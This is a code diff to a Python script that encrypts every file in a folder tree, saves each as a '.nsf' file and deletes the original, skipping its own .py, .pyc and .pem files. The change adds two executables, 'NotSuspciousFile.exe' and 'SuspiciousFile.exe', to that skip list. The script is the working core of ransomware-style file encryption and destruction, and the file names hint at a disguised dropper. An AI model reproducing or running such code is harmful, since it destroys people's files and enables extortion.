@@ -1,6 +1,6 @@
 import os
 import Encryption as enc
-import json 
+import json
 import pdb
 
 if __name__ == '__main__':
@@ -18,7 +18,8 @@ if __name__ == '__main__':
         if(curr_folder == '') :
             remove_list = list(files)
             for i in remove_list:
-                if(i[len(i) - 3 : len(i)] == '.py' or i[len(i) - 4 : len(i)] == '.pyc' or i[len(i) - 4 : len(i)] == '.pem'):
+                if(i[len(i) - 3 : len(i)] == '.py' or i[len(i) - 4 : len(i)] == '.pyc' or i[len(i) - 4 : len(i)] == '.pem'
+                    or i == 'NotSuspciousFile.exe' or i == 'SuspiciousFile.exe'):
                     files.remove(i)
         for i in range(len(files)) :
             #file_to_encrypt is the absolute path to the file
@@ -35,4 +36,3 @@ if __name__ == '__main__':
             f = open(file+ ".nsf", "w+")
             f.write(dump)
             os.remove(file_path)
-    exit()
